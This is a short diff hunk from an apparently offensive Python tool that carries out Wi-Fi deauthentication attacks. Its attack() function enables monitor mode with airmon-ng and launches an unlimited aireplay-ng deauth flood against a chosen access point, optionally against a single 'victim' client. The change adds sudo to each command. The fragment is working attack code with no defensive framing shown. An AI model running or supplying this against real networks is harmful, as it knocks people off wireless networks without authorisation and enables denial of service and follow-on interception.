@@ -213,13 +213,13 @@ def choose_victim():
 
 def attack(ap_mac, ap_channel, victim=None):
     global nic
-    subprocess.run(cmd(f"airmon-ng start {nic} {ap_channel}"), stdout=DEVNULL)
+    subprocess.run(cmd(f"sudo airmon-ng start {nic} {ap_channel}"), stdout=DEVNULL)
 
     try:
         if not victim: 
-            subprocess.run(cmd(f"aireplay-ng --deauth 0 -a {ap_mac} {nic}"))
+            subprocess.run(cmd(f"sudo aireplay-ng --deauth 0 -a {ap_mac} {nic}"))
         else:
-            subprocess.run(cmd(f"aireplay-ng --deauth 0 -c {victim} -a {ap_mac} {nic}"))
+            subprocess.run(cmd(f"sudo aireplay-ng --deauth 0 -c {victim} -a {ap_mac} {nic}"))
 
     except KeyboardInterrupt:
         reset_nic(nic)
